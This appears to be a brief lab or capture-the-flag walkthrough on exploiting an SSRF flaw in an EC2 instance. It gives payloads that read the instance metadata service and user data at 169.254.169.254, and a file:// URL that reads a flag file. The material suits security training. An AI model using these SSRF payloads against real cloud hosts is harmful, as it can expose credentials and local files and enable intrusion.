## Vulnerability Utilization

On EC2 with SSRF vulnerabilities, we can use SSRF to read EC2 metadata, user data and other information.

read metadata

```shell
http://169.254.169.254/latest/meta-data/
```

read user data

> The premise is that the target has been configured with user data, otherwise will be disconnected.

```shell
http://169.254.169.254/latest/user-data
```

In the user data information, you can see that there is a flag file in the root directory of the shooting range, try to use SSRF to read this file.

```shell
file:///flag69152201.txt
```
